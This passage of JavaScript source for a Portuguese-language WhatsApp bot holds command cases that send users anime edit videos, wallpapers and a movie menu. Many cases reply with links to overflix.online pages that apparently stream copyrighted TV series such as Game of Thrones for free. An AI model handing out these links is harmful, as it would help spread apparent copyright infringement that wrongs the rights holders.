🎥 *Game of Thrones:* https://overflix.online/series/game-of-thrones-hd-online-gratis/`)
break

case 'serie11':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Legados:* https://overflix.online/series/legados-gratis-hd-online/`)
break

case 'serie12':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *The Good Doctor:* https://overflix.online/series/the-good-doctor-o-bom-doutor-hd-online/`)
break

case 'serie13':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *The Walking Dead:* https://overflix.online/series/the-walking-dead/`)
break

case 'serie14':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Peaky Blinders:* https://overflix.online/series/peaky-blinders-sangue-apostas-e-navalhas/`)
break

case 'serie15':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Diarios de um vampiro:* https://overflix.online/series/diarios-de-um-vampiro/`)
break

case 'serie16':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Gavião Arqueiro:* https://overflix.online/series/gaviao-arqueiro-full-online-gratis/`)
break 

case 'serie17':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Westworld:* https://overflix.online/series/westworld-hd-gratis-online/`)
break

case 'serie18':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Lúcifer:* https://overflix.online/series/lucifer-online-hd/`)
break

case 'serie19':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Lobo Adolecentes:* https://overflix.online/series/lobo-adolescente/`)
break

case 'serie20':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *La Casa de Papel:* https://overflix.online/series/la-casa-de-papel/`)
break

case 'serie21':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Cobra Kai:* https://overflix.online/series/cobra-kai-online-gratis-hd/`)
break

case 'serie22':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Love Victor:* https://overflix.online/series/love-victor-gratis-online-hd/`)
break

case 'serie23':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Vikings:* https://overflix.online/series/vikings-hd/`)
break

case 'serie24':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Cavaleiro da Lua:* https://overflix.online/series/cavaleiro-da-lua-online-gratis-hd-full/`) 
break

case 'serie25':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Fear The Walking Dead:* https://overflix.online/series/fear-the-walking-dead/`)
break

case 'serie26':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Rick Morty:* https://overflix.online/series/rick-morty/`)
break

case 'serie27':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Round 6:* https://overflix.online/series/round-6-online-gratis-hd-full/`)
break

case 'serie28':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Carnival Row:* https://overflix.online/series/carnival-row-online-hd/`)
break

case 'serie29':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Dark:* https://overflix.online/series/dark/`)
break

case 'serie30':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Arqueiro:* https://overflix.online/series/arqueiro/`)
break 

case 'serie31':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Eu Nunca:* https://overflix.online/series/eu-nunca/`) 
break

case 'serie32':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *The Last Kingdom:* https://overflix.online/series/the-last-kingdom/`) 
break

case 'serie33':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *O livro de Boba Fett:* https://overflix.online/series/o-livro-de-boba-fett-hd-online-gratis-full/`)
break

case 'serie34':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Ragnarok:* https://overflix.online/series/ragnarok/`)
break 

case 'serie35':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *OS 100:* https://overflix.online/series/os-100/`)
break

case 'serie36':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *FBI:* https://overflix.online/series/fbi/`)
break

case 'serie37':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Extracurricular:* https://overflix.online/series/extracurricular/`)
break

case 'serie38':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Halo:* https://overflix.online/series/halo-online-gratis/`)
break

case 'serie39':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Warrior Nun:* https://overflix.online/series/warrior-nun-online-completo/`)
break

case 'serie40':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Anne With:* https://overflix.online/series/anne-with-an-e/`)
break

case 'serie41':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Patrulha do destino:* https://overflix.online/series/patrulha-do-destino-online/`)
break

case 'serie42':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Dinastia:* https://overflix.online/series/dinastia/`)
break

case 'serie43':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Watchmen:* https://overflix.online/series/watchmen/`)
break

case 'serie44':
await reply(`Olá ${pushname}, aqui está o seu pedido, espero que você goste!
🪀 *Número:* @${sender.split("@")[0]}

🎥 *Lovecraft Country:* https://overflix.online/series/lovecraft-country-dublado-legendado-online-hd-gratis/`)
break
case 'listaedits': case 'edits': {
sections = [
{title: `${NickDono}️`,
rows: [
{title: "✰ۜۜ͜͡𝑬𝑫𝑰𝑻𝑺 𝐍𝐀𝐑𝐔𝐓𝐎️‍🦊", rowId: `${prefix}narutoedits`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝑬𝑫𝑰𝑻𝑺 𝐎𝐍𝐄-𝐏𝐈𝐄𝐂𝐄🌊", rowId: `${prefix}onepieceedits`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝑬𝑫𝑰𝑻𝑺 𝐍𝐀𝐍𝐀𝐓𝐒𝐔🌼", rowId: `${prefix}nanatsuedits`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝑬𝑫𝑰𝑻𝑺 𝐒𝐏𝐘×𝐅𝐀𝐌𝐈𝐋𝐘🧙🏻‍♂️", rowId: `${prefix}spyxfamilyedits`, description: `${setting.NomeDoBot}`},
{title: "✰ۜۜ͜͡𝑬𝑫𝑰𝑻𝑺 𝐇𝐔𝐍𝐓𝐄𝐑👻", rowId: `${prefix}hunteredits`, description: `${setting.NomeDoBot}`}
]
},
]
 
const listMessage2 = {
text: `Bem vindo(a), *${pushname}*,\nSelecione quantos você desejar.`,
  footer: `By: ${NomeDoBot}`,
  title: `ꪶ𝐋𝐈𝐒𝐓𝐀-𝐃𝐄-𝐄𝐃𝐈𝐓𝐒ꫂ`,
  buttonText: "😈𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑😈",
  sections
}
sendMsg = await conn.sendMessage(from, listMessage2, {quoted: selo})
}
break

case 'narutoedits': {
let data = fs.readFileSync('./armor/mídia-ft-vd/edits-videos/editsnaruto.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`     ₊˚.ೃೀ𝑬𝑫𝑰𝑻𝑺✰𝐍𝐀𝐑𝐔𝐓𝐎፝֯֟⋆⁺˖⸙̭❛◌*̥₊\nıl.ılı.lıllılı.ıllı..ılı.lıllılı.ıllı.ılı.lılı.lıllılıl.lıl.ılıl.lı\n➤ۣۜۜ͜͡👤 Solicitado por: ${pushname}\n_Deseja mais? Clica em próxima-edit._`]
var taikin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
tst = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}narutoedits`, buttonText: {displayText: '✰ۣۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐄𝐃𝐈𝐓🔥'}, type: 1}]
let thumbInfo = `${taikin}`;
buttonMessage = {video: tst, caption: `${thumbInfo}`, 
footer: `By: ${NomeDoBot}`
, buttons: buttons, headerType: 4}
conn.sendMessage(from, buttonMessage,{quoted: selo})
}
break

case 'onepieceedits': {
let data = fs.readFileSync('./armor/mídia-ft-vd/edits-videos/editsonepiece.js');

jsonData = JSON.parse(data);

randIndex = Math.floor(Math.random() * jsonData.length);

var foda =[` ₊˚.ೃೀ𝑬𝑫𝑰𝑻𝑺✰𝐎𝐍𝐄-𝐏𝐈𝐄𝐂𝐄፝֯֟⋆⁺˖⸙̭❛◌*̥₊\nıl.ılı.lıllılı.ıllı..ılı.lıllılı.ıllı.ılı.lılı.lıllılıl.lıl.ılıl.lı\n➤ۣۜۜ͜͡👤 Solicitado por: ${pushname}\n_Deseja mais? Clica em próxima-edit._`]

var taikin = foda[Math.floor(Math.random() * foda.length)]

randKey = jsonData[randIndex];

tst = await getBuffer(randKey.result)

let buttons = [

{buttonId: `${prefix}onepieceedits`, buttonText: {displayText: '✰ۣۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐄𝐃𝐈𝐓🔥'}, type: 1}]

let thumbInfo = `${taikin}`;

buttonMessage = {video: tst, caption: `${thumbInfo}`, 

footer: `By: ${NomeDoBot}`

, buttons: buttons, headerType: 4}

conn.sendMessage(from, buttonMessage,{quoted: selo})

}

break

case 'nanatsuedits': {
let data = fs.readFileSync('./armor/mídia-ft-vd/edits-videos/editsnanatsu.js');

jsonData = JSON.parse(data);

randIndex = Math.floor(Math.random() * jsonData.length);

var foda =[`   ₊˚.ೃೀ𝑬𝑫𝑰𝑻𝑺✰𝐍𝐀𝐍𝐀𝐓𝐒𝐔፝֯֟⋆⁺˖⸙̭❛◌*̥₊\nıl.ılı.lıllılı.ıllı..ılı.lıllılı.ıllı.ılı.lılı.lıllılıl.lıl.ılıl.lı\n➤ۣۜۜ͜͡👤 Solicitado por: ${pushname}\n_Deseja mais? Clica em próxima-edit._`]

var taikin = foda[Math.floor(Math.random() * foda.length)]

randKey = jsonData[randIndex];

tst = await getBuffer(randKey.result)

let buttons = [

{buttonId: `${prefix}nanatsuedits`, buttonText: {displayText: '✰ۣۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐄𝐃𝐈𝐓🔥'}, type: 1}]

let thumbInfo = `${taikin}`;

buttonMessage = {video: tst, caption: `${thumbInfo}`, 

footer: `By: ${NomeDoBot}`

, buttons: buttons, headerType: 4}

conn.sendMessage(from, buttonMessage,{quoted: selo})

}

break

case 'bleachedits': {
let data = fs.readFileSync('./armor/mídia-ft-vd/edits-videos/editsbleach.js');

jsonData = JSON.parse(data);

randIndex = Math.floor(Math.random() * jsonData.length);

var foda =[`     ₊˚.ೃೀ𝑬𝑫𝑰𝑻𝑺✰𝐁𝐋𝐄𝐀𝐂𝐇፝֯֟⋆⁺˖⸙̭❛◌*̥₊\nıl.ılı.lıllılı.ıllı..ılı.lıllılı.ıllı.ılı.lılı.lıllılıl.lıl.ılıl.lı\n➤ۣۜۜ͜͡👤 Solicitado por: ${pushname}\n_Deseja mais? Clica em próxima-edit._`]

var taikin = foda[Math.floor(Math.random() * foda.length)]

randKey = jsonData[randIndex];

tst = await getBuffer(randKey.result)

let buttons = [

{buttonId: `${prefix}bleachedits`, buttonText: {displayText: '✰ۣۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐄𝐃𝐈𝐓🔥'}, type: 1}]

let thumbInfo = `${taikin}`;

buttonMessage = {video: tst, caption: `${thumbInfo}`, 

footer: `By: ${NomeDoBot}`

, buttons: buttons, headerType: 4}

conn.sendMessage(from, buttonMessage,{quoted: selo})

}

break

case 'hunteredits': {
let data = fs.readFileSync('./armor/mídia-ft-vd/edits-videos/editshunter.js');

jsonData = JSON.parse(data);

randIndex = Math.floor(Math.random() * jsonData.length);

var foda =[`₊˚.ೃೀ𝑬𝑫𝑰𝑻𝑺✰𝐇𝐔𝐍𝐓𝐄𝐑×𝐇𝐔𝐍𝐓𝐄𝐑፝֯֟⋆⁺˖⸙̭❛◌*̥₊\nıl.ılı.lıllılı.ıllı..ılı.lıllılı.ıllı.ılı.lılı.lıllılıl.lıl.ılıl.lı\n➤ۣۜۜ͜͡👤 Solicitado por: ${pushname}\n_Deseja mais? Clica em próxima-edit._`]

var taikin = foda[Math.floor(Math.random() * foda.length)]

randKey = jsonData[randIndex];

tst = await getBuffer(randKey.result)

let buttons = [

{buttonId: `${prefix}hunteredits`, buttonText: {displayText: '✰ۣۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐄𝐃𝐈𝐓🔥'}, type: 1}]

let thumbInfo = `${taikin}`;

buttonMessage = {video: tst, caption: `${thumbInfo}`, 

footer: `By: ${NomeDoBot}`

, buttons: buttons, headerType: 4}

conn.sendMessage(from, buttonMessage,{quoted: selo})

}

break

case 'spyxfamilyedits': {
let data = fs.readFileSync('./armor/mídia-ft-vd/edits-videos/editspyxfamily.js');

jsonData = JSON.parse(data);

randIndex = Math.floor(Math.random() * jsonData.length);

var foda =[`₊˚.ೃೀ𝑬𝑫𝑰𝑻𝑺✰𝐒𝐏𝐘×𝐅𝐀𝐌𝐈𝐋𝐘፝֯֟⋆⁺˖⸙̭❛◌*̥₊\nıl.ılı.lıllılı.ıllı..ılı.lıllılı.ıllı.ılı.lılı.lıllılıl.lıl.ılıl.lı\n➤ۣۜۜ͜͡👤 Solicitado por: ${pushname}\n_Deseja mais? Clica em próxima-edit._`]

var taikin = foda[Math.floor(Math.random() * foda.length)]

randKey = jsonData[randIndex];

tst = await getBuffer(randKey.result)

let buttons = [

{buttonId: `${prefix}spyxfamilyedits`, buttonText: {displayText: '✰ۣۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐀-𝐄𝐃𝐈𝐓🔥'}, type: 1}]

let thumbInfo = `${taikin}`;

buttonMessage = {video: tst, caption: `${thumbInfo}`, 

footer: `By: ${NomeDoBot}`

, buttons: buttons, headerType: 4}

conn.sendMessage(from, buttonMessage,{quoted: selo})

}

break
case 'wallpaperanime': //hya
reply(`*Ei ${pushname}*, já estou enviando sua imagem... Enquanto isso tome um café!`)
buttons = [
{buttonId: `${prefix}wallpaperanime`, buttonText: {displayText: '✰ۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐎-𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑🌟'}, type: 1}]
buttonMessagse = {
image: {url: `https://apis.nezsab-apis.xyz/random/wallpaperanime?apikey=${Luix1397}`},
caption: `▢ ⌁ Olá, aqui está *${pushname}* o seu wallpaper de anime.\n▢ ⌁ Pressione o botão abaixo para a próximo wallpaper!`,
footer: `By: ${setting.NomeDoBot}`,
buttons: buttons,
headerType: 4
}
sendMsg = conn.sendMessage(from, buttonMessagse, {quoted: selo})
break

case 'listawallpaper': case 'wallpaper2': {
sections = [
{title: "",
rows: [
{title: "✰ۜۜ͜͡𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑-𝐒𝐀𝐓𝐀𝐍𝐈𝐂👺", rowId: `${prefix}satanic`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑-𝐀𝐍𝐈𝐌𝐄🎎", rowId: `${prefix}wallpaperanime`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑-𝐂𝐘𝐁𝐄𝐑𝐒𝐏𝐀𝐂𝐄🤖", rowId: `${prefix}cyberspace`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑-𝐆𝐀𝐌𝐄𝐑🎯", rowId: `${prefix}gamer`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑-𝐓𝐄𝐂𝐍𝐎𝐋𝐎𝐆𝐈𝐂💻", rowId: `${prefix}gamer`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑-𝐏𝐏𝐂𝐎𝐔𝐏𝐋𝐄🪩", rowId: `${prefix}ppcouple`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑-𝐀𝐄𝐒𝐓𝐇𝐄𝐓𝐈𝐂❤‍🔥", rowId: `${prefix}aesthetic`, description: `${NomeDoBot}`}
]
},
]
 
const listMessage2 = {
text: `*${tempo}*, ${pushname} !\nSelecione quais você desejar.`,
  footer: `By: ${NomeDoBot}`,
  title: `ꪶ𝐋𝐈𝐒𝐓𝐀-𝐖𝐀𝐋𝐋𝐏𝐀𝐏𝐄𝐑ꫂ`,
  buttonText: "🪓𝐒𝐄𝐋𝐄𝐂𝐈𝐎𝐍𝐀𝐑🪓",
  sections
}
sendMsg = await conn.sendMessage(from, listMessage2, {quoted: selo})
}
break

case 'cyberspace': case 'satanic': case 'gamer': case 'wallpapertec': case 'ppcouple': case 'aesthetic': {//@Taiko
reply(`<❗> Aguarde.. estou enviando seu pedido.`)
let data = fs.readFileSync(`./armor/mídia-ft-vd/wallpaper/${command}.js`);
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
var foda =[`▢ ⌁ Aqui está o seu wallpaper: ${command}\n▢ ⌁ Caso desejar mais clique em próximo.`]
var taikin = foda[Math.floor(Math.random() * foda.length)]
randKey = jsonData[randIndex];
tst = await getBuffer(randKey.result)
let buttons = [
{buttonId: `${prefix}${command}`, buttonText: {displayText: '✰ۣۜۜ͜͡𝐏𝐑𝐎́𝐗𝐈𝐌𝐎💫'}, type: 1}]
let thumbInfo = `${taikin}`;
blabla = await getBuffer(`https://telegra.ph/file/2bd234a85478c71cfa817.jpg`);
buttonMessage = {image: tst, caption: `${thumbInfo}`, 
footer: `${NomeDoBot}`
, buttons: buttons, headerType: 4}
conn.sendMessage(from, buttonMessage, {quoted: selo})
}
break
case 'listafilmes': case 'filmes': {
sections = [
{title: `${NomeDoBot}`,
rows: [
{title: "✰ۜۜ͜͡𝐁𝐑𝐈𝐍𝐐𝐔𝐄𝐃𝐎𝐒 𝐃𝐎 𝐓𝐄𝐑𝐑𝐎𝐑🎥", rowId: `${prefix}filme1`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐇𝐎𝐌𝐄𝐌 𝐀𝐑𝐀𝐍𝐇𝐀 𝐒𝐄𝐌 𝐕𝐎𝐋𝐓𝐀 𝐏𝐑𝐀 𝐂𝐀𝐒𝐀🎥  ", rowId: `${prefix}filme2`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐈𝐃𝐀𝐃𝐄 𝐏𝐄𝐑𝐃𝐈𝐃𝐀🎥 ", rowId: `${prefix}filme3`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐇𝐎𝐑 𝐀𝐌𝐎𝐑 𝐄 𝐓𝐑𝐎𝐕𝐀̃𝐎🎥 ", rowId: `${prefix}filme4`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐈𝐍𝐎́𝐐𝐔𝐈𝐎 2🎥", rowId: `${prefix}filme5`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐑𝐔𝐀 𝐃𝐎 𝐌𝐄𝐃𝐎 1🎥", rowId: `${prefix}filme6`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐍𝐀 𝐌𝐄𝐍𝐓𝐄 𝐃𝐎 𝐃𝐄𝐌𝐎̂𝐍𝐈𝐎🎥", rowId: `${prefix}filme7`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎 𝐇𝐎𝐌𝐄𝐌 𝐍𝐀𝐒 𝐓𝐑𝐄𝐕𝐀𝐒🎥", rowId: `${prefix}filme8`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐎𝐌𝐏𝐈𝐋𝐀𝐃𝐎𝐒 𝐓𝐄𝐑𝐑𝐎𝐑🎥 ", rowId: `${prefix}filme9`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐇𝐀𝐋𝐋𝐎𝐖𝐄𝐄𝐍𝐒 𝐊𝐈𝐋𝐋𝐒 𝐎 𝐓𝐄𝐑𝐑𝐎𝐑 𝐂𝐎𝐍𝐓𝐈𝐍𝐔𝐀🎥 ", rowId: `${prefix}filme10`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎 𝐏𝐑𝐄𝐃𝐀𝐃𝐎𝐑  𝐀 𝐂𝐀𝐂̧𝐀𝐃𝐀🎥", rowId: `${prefix}filme11`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐎𝐒 𝐏𝐑𝐈𝐌𝐄𝐈𝐑𝐎𝐒 𝐏𝐀𝐒𝐒𝐎𝐒 𝐃𝐄 𝐆𝐑𝐎𝐎𝐓🎥", rowId: `${prefix}filme12`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐀́ 𝐂𝐇𝐎𝐕𝐄𝐍𝐃𝐎 𝐇𝐀𝐌𝐁𝐔́𝐑𝐆𝐔𝐄𝐑🎥", rowId: `${prefix}filme13`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐈𝐍𝐈𝐎𝐍𝐒 𝐀 𝐎𝐑𝐈𝐆𝐄𝐌 𝐃𝐄 𝐆𝐑𝐔🎥", rowId: `${prefix}filme14`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐇𝐄 𝐒𝐀𝐍𝐃𝐌𝐀𝐍🎥", rowId: `${prefix}filme15`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐓𝐇𝐄 𝐁𝐀𝐓𝐌𝐀𝐍🎥", rowId: `${prefix}filme16`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐒 𝐁𝐑𝐀𝐍𝐐𝐔𝐄𝐋𝐀𝐒🎥", rowId: `${prefix}filme17`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐈𝐍𝐓𝐄𝐑𝐄𝐒𝐓𝐄𝐋𝐀𝐑🎥", rowId: `${prefix}filme18`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐔𝐌 𝐎𝐋𝐇𝐀𝐑 𝐃𝐎 𝐏𝐀𝐑𝐀𝐈𝐒𝐎🎥", rowId: `${prefix}filme19`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐁𝐀𝐑𝐁𝐈𝐄🎥", rowId: `${prefix}filme20`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐀𝐙𝐄 𝐑𝐔𝐍𝐍𝐄𝐑🎥", rowId: `${prefix}filme21`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐀𝐃 𝐌𝐀𝐗🎥", rowId: `${prefix}filme22`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐇𝐎𝐌𝐄𝐌 𝐀𝐑𝐀𝐍𝐇𝐀🎥", rowId: `${prefix}filme23`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐒𝐇𝐄𝐑𝐋𝐎𝐂𝐊 𝐇𝐎𝐌𝐄𝐒 (𝐓𝐎𝐃𝐎𝐒)🎥", rowId: `${prefix}filme24`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐈𝐍𝐐𝐔𝐄𝐍𝐓𝐀 𝐓𝐎𝐍𝐒 𝐃𝐄 𝐂𝐈𝐍𝐙𝐀 (𝐓𝐎𝐃𝐎𝐒)🎥", rowId: `${prefix}filme25`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐑𝐄𝐏𝐔́𝐒𝐂𝐔𝐋𝐎 (𝐓𝐎𝐃𝐎𝐒)🎥", rowId: `${prefix}filme26`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐁𝐀𝐃 𝐁𝐎𝐘𝐒 (𝐓𝐎𝐃𝐎𝐒)🎥", rowId: `${prefix}filme27`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐕𝐈𝐍𝐆𝐀𝐃𝐎𝐑𝐄𝐒 (𝐓𝐎𝐃𝐎𝐒)🎥", rowId: `${prefix}filme28`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐕𝐄𝐋𝐎𝐙𝐄𝐒 𝐄 𝐅𝐔𝐑𝐈𝐎𝐒𝐎𝐒 (𝐓𝐎𝐃𝐎𝐒)🎥", rowId: `${prefix}filme29`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐁𝐀𝐓𝐌𝐀𝐍🎥", rowId: `${prefix}filme30`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐒 𝐕𝐀𝐍𝐓𝐀𝐆𝐄𝐍𝐒 𝐃𝐄 𝐒𝐄𝐑 𝐈𝐍𝐕𝐈𝐒𝐈́𝐕𝐄𝐋🎥", rowId: `${prefix}filme31`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐌𝐎𝐀𝐍𝐀🎥", rowId: `${prefix}filme32`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐑𝐎𝐆𝐑𝐀𝐌𝐀 𝐃𝐑 𝐏𝐑𝐎𝐓𝐄𝐂̧𝐀̃𝐎 𝐏𝐀𝐑𝐀 𝐏𝐑𝐈𝐍𝐂𝐄𝐒𝐀𝐒:🎥", rowId: `${prefix}filme33`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐒 𝐂𝐑𝐎̂𝐍𝐈𝐂𝐀𝐒 𝐃𝐄 𝐍𝐀́𝐑𝐍𝐈𝐀 (𝐓𝐎𝐃𝐎𝐒🎥", rowId: `${prefix}filme34`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀 𝐂𝐔𝐋𝐏𝐀 𝐄́ 𝐃𝐀𝐒 𝐄𝐒𝐓𝐑𝐄𝐋𝐀𝐒🎥", rowId: `${prefix}filme35`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐕𝐄𝐑𝐃𝐀𝐃𝐄 𝐎𝐔 𝐃𝐄𝐒𝐀𝐅𝐈𝐎:🎥", rowId: `${prefix}filme36`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐆𝐀𝐑𝐎𝐓𝐀 𝐈𝐍𝐅𝐄𝐑𝐍𝐀𝐋🎥", rowId: `${prefix}filme37`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐂𝐎𝐌 𝐀𝐌𝐎𝐑,𝐒𝐈𝐌𝐎𝐍🎥", rowId: `${prefix}filme38`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀𝐅𝐓𝐄𝐑 1:🎥", rowId: `${prefix}filme39`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐀 5 𝐏𝐀𝐒𝐒𝐎𝐒 𝐃𝐄 𝐕𝐎𝐂𝐄̂:🎥", rowId: `${prefix}filme40`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐇𝐀𝐍𝐍𝐀𝐇 𝐌𝐎𝐍𝐓𝐀𝐍𝐀-𝐎 𝐅𝐈𝐋𝐌𝐄🎥", rowId: `${prefix}filme41`, description: `${NomeDoBot}`},
{title: "✰ۜۜ͜͡𝐏𝐎𝐍𝐓𝐄 𝐏𝐀𝐑𝐀 𝐓𝐄𝐑𝐀𝐁𝐈𝐓𝐈𝐀🎥", rowId: `${prefix}filme42`, description: `${NomeDoBot}`},
